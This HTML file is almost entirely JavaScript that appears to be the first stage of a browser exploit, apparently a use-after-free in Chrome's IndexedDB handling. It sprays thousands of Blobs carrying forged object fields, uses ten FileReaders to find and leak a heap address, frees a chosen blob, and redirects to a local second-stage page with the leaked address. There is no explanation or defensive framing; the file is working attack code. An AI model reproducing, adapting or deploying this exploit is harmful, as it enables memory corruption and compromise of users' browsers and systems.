<html>
<body>
<script>
var num=0
var aa=0
var heap_addr
 function String2ArrayBuffer(str, cb) {
        var b = new Blob([str]);
        var f = new FileReader();
        f.onload = function(e) {
            cb(e.target.result);
        }
        f.readAsArrayBuffer(b);
    }
var blob_list = []
var reader1 = new FileReader();
var reader2 = new FileReader();
var reader3 = new FileReader();
var reader4 = new FileReader();
var reader5 = new FileReader();
var reader6 = new FileReader();
var reader7 = new FileReader();
var reader8 = new FileReader();
var reader9 = new FileReader();
var reader10 = new FileReader();
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
async function step1(){
var db;
var request = window.indexedDB.open("db1", 1);
var r2;
var blob_list = []
request.onsuccess = async function (event) {
    r2 = window.indexedDB.open("db1", 3);
    db = request.result;
    r2.onerror = async function (event) {
        let ab111 = new ArrayBuffer(0x148);
        var uaf_ta11 = new BigUint64Array(ab111);
        uaf_ta11[0] = 0x12345679n; // magic
        uaf_ta11[1] = 0xffffffff00000030n  //reference count
        uaf_ta11[35] = 0x101n;  //将active_request_置非0
        for(let i = 0; i < 0x5000; i++){
        var a=new Blob([ab111]);
            blob_list.push(a);
        
        }
    var r3= window.indexedDB.deleteDatabase("db1");
    console.log(blob_list)
    var blob1=blob_list[0];

    reader1.addEventListener("loadend", function() {
        var tmp = new BigUint64Array(reader1.result);
        if(tmp[36]!=0x0n){
            console.log(aa)
            console.log(tmp[36])
            heap_addr=tmp[36]
            num=aa
        }
            
    });
    reader2.addEventListener("loadend", function() {
        var tmp = new BigUint64Array(reader2.result);
        if(tmp[36]!=0x0n){
            console.log(aa)
            console.log(tmp[36])
            heap_addr=tmp[36]
            num=aa+1
        }
    });
    reader3.addEventListener("loadend", function() {
        var tmp = new BigUint64Array(reader3.result);
        if(tmp[36]!=0x0n){
            console.log(aa)
            console.log(tmp[36])
            heap_addr=tmp[36]
            num=aa+2
        }
    });
    reader4.addEventListener("loadend", function() {
        var tmp = new BigUint64Array(reader4.result);
        if(tmp[36]!=0x0n){
            console.log(aa)
            console.log(tmp[36])
            heap_addr=tmp[36]
            num=aa+3
        }
    });
    reader5.addEventListener("loadend", function() {
        var tmp = new BigUint64Array(reader5.result);
        if(tmp[36]!=0x0n){
            console.log(aa)
            console.log(tmp[36])
            heap_addr=tmp[36]
            num=aa+4
        }
    });
    reader6.addEventListener("loadend", function() {
        var tmp = new BigUint64Array(reader6.result);
        if(tmp[36]!=0x0n){
            console.log(aa)
            console.log(tmp[36])
            heap_addr=tmp[36]
            num=aa+5
        }
    });
    reader7.addEventListener("loadend", function() {
        var tmp = new BigUint64Array(reader7.result);
        if(tmp[36]!=0x0n){
            console.log(aa)
            console.log(tmp[36])
            heap_addr=tmp[36]
            num=aa+6
        }
    });
    reader8.addEventListener("loadend", function() {
        var tmp = new BigUint64Array(reader8.result);
        if(tmp[36]!=0x0n){
            console.log(aa)
            console.log(tmp[36])
            heap_addr=tmp[36]
            num=aa+7
        }
    });
    reader9.addEventListener("loadend", function() {
        var tmp = new BigUint64Array(reader9.result);
        if(tmp[36]!=0x0n){
            console.log(aa)
            console.log(tmp[36])
            heap_addr=tmp[36]
            num=aa+8
        }
    });
    reader10.addEventListener("loadend", function() {
        var tmp = new BigUint64Array(reader10.result);
        if(tmp[36]!=0x0n){
            console.log(aa)
            console.log(tmp[36])
            heap_addr=tmp[36]
            num=aa+9
        }
    });
    for(aa=0;aa<0x5000;aa+=10){
        await sleep(10)
        var blob1=blob_list[aa];
        reader1.readAsArrayBuffer(blob1);
        var blob2=blob_list[aa+1];
        reader2.readAsArrayBuffer(blob2);
        var blob3=blob_list[aa+2];
        reader3.readAsArrayBuffer(blob3);
        var blob4=blob_list[aa+3];
        reader4.readAsArrayBuffer(blob4);
        var blob5=blob_list[aa+4];
        reader5.readAsArrayBuffer(blob5);
        var blob6=blob_list[aa+5];
        reader6.readAsArrayBuffer(blob6);
        var blob7=blob_list[aa+6];
        reader7.readAsArrayBuffer(blob7);
        var blob8=blob_list[aa+7];
        reader8.readAsArrayBuffer(blob8);
        var blob9=blob_list[aa+8];
        reader9.readAsArrayBuffer(blob9);
        var blob10=blob_list[aa+9];
        reader10.readAsArrayBuffer(blob10);
    }
    
    let ab2 = new ArrayBuffer(0x1000*0x800);
        var pad = new BigUint64Array(ab2);
    pad[0] = 0x22334455n;
    for(let i = 0; i < 180; i++){
        var a=new Blob([ab2]);
    }
    console.log(num)
    b=blob_list[num]
    url = URL.createObjectURL(b)
    URL.revokeObjectURL(url)
    b=null
    blob_list[num]=null
    location.replace("file:///home/yyt/Desktop/chrome_test/exp2.html#"+heap_addr)
    }
};
}

step1()
</script>
</body>
</html>
